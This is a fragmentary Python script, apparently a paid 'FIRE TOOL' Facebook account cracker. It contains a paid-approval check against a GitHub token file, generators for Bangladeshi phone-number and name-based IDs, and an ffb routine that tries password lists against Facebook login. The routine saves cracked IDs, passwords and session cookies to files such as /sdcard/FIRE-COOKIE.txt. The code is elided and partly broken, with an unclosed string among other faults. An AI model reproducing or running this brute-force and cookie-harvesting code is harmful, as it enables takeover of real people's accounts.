...
try:
    ...
    os.system('python Paid2.py')
try:
  import pycurl
except:
  os.system("pip install pycurl")
  import pycurl
os.system('xdg-open https://chat.whatsapp.com/01643537105')

try:
    prox= requests.get('https://github.com/apon200490/aproovaal.txt/blob/main/aproovaal.txt').text
...
[•] STYLE     : FIRE BRO 🥵
[•] WhatsApp : +8801643537105
[•] FaceBook  :  /crazehacker2000
[•] Version      :  {RED} 0.1
[•] YouTube :  @AponChowdhury-zs5bv
____________________________________________________________
{WHITE}=========================================
   \33[37;41m\t 	APON CHOWDHURY \33[0;m
{WHITE}=========================================""")
def linex():
    print('\033[1;37m----------------------------------------------')
...
def approval():
  ...
  try:
    httpCaht = get_response('https://github.com/apon200490/aproovaal.txt')
    if realid in httpCaht:
      ...
      print('\33[1;37m ====================================================')
      print (" \33[37;41m\t WELCOME TO FIRE TOOL AND ENJOY \33[0;m")
      print('\33[1;37m ====================================================')

      print ("\33[1;37m SEND 200 BDT (FOR 15 DAYS APPROVEL)")
      print('\33[1;37m ====================================================')
      print ("\33[1;37m SEND 500 BDT (FOR 30 DAYS APPROVEL)")
      print('\33[1;37m ====================================================')
      print ("\33[1;37m NAGAD (01643537105)")
      print ("\33[1;37m ROCKET  (01643537105)")
      print ("\33[37;41m\t INSHALLAH DAILY LUSH UPDATES \33[0;m")
      input(' IIF YOU ARE FREE USER THEN DONT PRESS ENTER')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('xdg-open https://chat.whatsapp.com/BrjojQHxQrjHisbpnGQywX)
      sys.exit()
      #time.sleep(1)
      #approval()
        ...
        #       chk()
                ...
                if x == ("***"):
                        ...
                        if xd in ['1','01']:
                                ...
                                print(' PUT FILE EXAMPLE :  /sdcard/Fire.txt.etc..')
                                linex()
...
def pak():
                ...
                linex()
                input(' PRESS ENTER TO BACK ')
                os.system('python Paid1.py')
def bd():
                user=[]
                clear()
                print('\033[1;31m CODE EXAMPLE : 017,016,018,019')
                code = input('\033[1;37m PUT CODE: ')
                try:
                        limit = int(input('\033[1;31m EXAMPLE : 2000, 3000, 5000, 10000\n\033[1;37m PUT LIMIT : '))
                except ValueError:
...
def gmail():
                ...
                clear()
                print('\033[1;37m example: muhammad, mehedi, ibrahim, imran\033[1;97m')
                linex()
                first = input(' Put first name: ')
                linex()
                print('\033[1;37m example: khan, hasan, ahmed\033[1;97m')
                linex()
...
def ffb(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [FIRE-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [LEGEND-FIRE-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/FIRE-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/FIRE-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[FIRE-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[1;31m [ALONE-FIRE-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/FIRE-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/FIRE-CP.txt','a').write(ids+'|'+pas+'\n')
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [LEGEND-FIRE-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/FIRE-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/FIRE-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                    ...
                                    #    print('\r\r\x1b[1;31m [FIRE-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/FIRE-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
                ...
                for pas in passlist:
                        ...
                        if 'your account was locked' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/FIRE-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/FIRE-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
